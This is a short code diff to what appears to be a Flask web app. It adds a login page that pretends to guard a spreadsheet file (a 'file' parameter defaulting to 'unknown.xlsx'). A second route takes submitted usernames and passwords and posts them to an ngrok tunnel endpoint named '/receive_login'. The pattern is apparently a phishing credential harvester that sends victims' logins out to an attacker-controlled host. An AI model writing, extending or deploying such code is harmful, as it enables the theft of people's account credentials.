@@ -38,6 +38,25 @@ def submit():
         print("❌ Failed to reach backend:", e)
         return f"Failed to reach backend: {e}", 500
 
+@app.route('/login', methods=['GET'])
+def login_form():
+    filename = request.args.get('file', 'unknown.xlsx')
+    return render_template('login.html', filename=filename)
+
+
+@app.route('/login', methods=['POST'])
+def login_submit():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    try:
+        response = requests.post(f"{NGROK_BACKEND_URL}/receive_login", data={
+            'username': username,
+            'password': password
+        })
+        return f"Login sent to backend. Response: {response.text}"
+    except requests.exceptions.RequestException as e:
+        return f"Failed to send login to backend: {e}", 500
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
